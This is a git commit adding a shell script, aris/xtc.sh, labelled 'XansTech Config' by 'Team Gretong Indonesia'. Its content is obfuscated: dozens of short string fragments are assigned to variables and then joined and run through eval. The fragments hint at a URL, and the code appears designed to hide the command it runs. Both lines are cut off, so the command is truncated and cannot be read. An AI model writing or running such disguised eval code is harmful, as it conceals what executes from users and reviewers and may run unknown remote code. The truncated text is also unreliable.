be1f0fcb8bb88347dec3ddcd985ffc8ed0613fe7
Anang11042000 <72434392+Anang11042000@users.noreply.github.com>
2021-02-16 15:19:13 +0000

    tamat

---
+++ aris/xtc.sh
@@ -0,0 +1,5 @@
+#XansTech Config
+#Team Gretong Indonesia
+z="
+";Gwz='183)';itz='X-04';LEBz='cnk/';Nvz='m/ra';hdz='uran';iYz='"$>
+eval "$Az$Bz$z$Cz$Dz$Ez$z$Fz$Dz$Gz$z$Hz$Iz$Jz$z$Kz$Lz$Mz$z$Nz$Oz$>
